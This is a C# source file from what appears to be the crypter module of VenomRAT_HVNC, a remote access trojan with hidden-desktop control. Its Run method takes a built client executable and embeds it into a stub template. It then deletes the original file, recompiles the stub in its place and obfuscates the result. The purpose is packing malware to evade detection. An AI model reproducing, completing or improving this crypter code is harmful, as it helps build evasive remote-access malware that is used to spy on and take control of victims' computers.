using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using Obfuscation;
using VenomRAT_HVNC.Crypter.Algorithms;
using VenomRAT_HVNC.Crypter.Other;
using Settings = VenomRAT_HVNC.Crypter.Other.Settings;

namespace VenomRAT_HVNC.Crypter;

public class Program
{
    public static Task Run(string pathClient)
    {
        if (string.IsNullOrEmpty(Settings.Stub))
        {
            throw new ArgumentNullException("pathClient");
        }

        if (!File.Exists(pathClient))
        {
            throw new FileNotFoundException($"Le fichier '{pathClient}' n'existe pas.");
        }

        try
        {
            string stub = Settings.Stub;

            // Supposant que vous voulez remplacer un autre texte dans 'stub'
            stub = stub.Replace(stub, Replace.Stub(stub, pathClient));

            if (File.Exists(pathClient))
            {
                File.Delete(pathClient);
            }

            Compiler.CompileCSharpFile(stub, pathClient);
            ObfuscateExe.Run(pathClient);
        }
        catch (Exception ex)
        {
            Debug.WriteLine($"Erreur lors de l'exécution : {ex.Message}");
            throw;
        }

        return Task.CompletedTask;
    }
}